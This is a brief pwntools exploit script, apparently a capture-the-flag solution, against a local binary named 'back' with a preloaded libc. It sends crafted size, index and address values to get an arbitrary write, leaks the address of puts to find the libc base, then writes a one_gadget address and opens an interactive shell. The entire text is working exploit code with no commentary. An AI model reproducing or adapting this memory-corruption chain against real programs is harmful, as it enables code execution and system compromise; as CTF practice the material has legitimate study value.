from pwn import *
io=process("./back",env={"LD_PRELOAD":"./libc.so.6"})
gdb.attach(io)
io.sendafter("size: ",str(1000000))
io.sendafter("idx: ",str(3020056))
io.sendafter("where: ",str(6295576))
io.send(p64(4196310))
io.recvuntil("puts: ")
puts = int(io.recvline().strip(),16)
base = puts - 0x809c0
one_gadget = base + 0x4f2c5
io.sendafter("size: ",str(10000))
io.sendafter("idx: ",str(3020056))
io.sendafter("where: ",str(6295576))
io.sendline(p64(one_gadget))
io.interactive()
